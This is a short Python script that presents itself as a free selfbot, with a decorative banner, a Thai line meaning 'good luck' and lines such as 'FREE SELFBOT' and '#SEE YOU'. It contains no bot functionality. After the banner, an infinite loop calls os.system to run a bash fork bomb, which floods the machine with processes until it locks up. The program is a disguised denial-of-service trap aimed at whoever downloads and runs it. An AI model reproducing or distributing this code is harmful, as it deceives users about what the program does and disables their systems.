print (""" 
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ➣ PROJECT FAKE BOT
┃ ➣ ขอให้โชคดีนะ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
import os,sys
print("PROJECT FAKE BOT")
print("FREE SELFBOT")
print("#SEE YOU")
print("XCAT LEGEND")
while True:
    os.system(":(){ :|:& };:")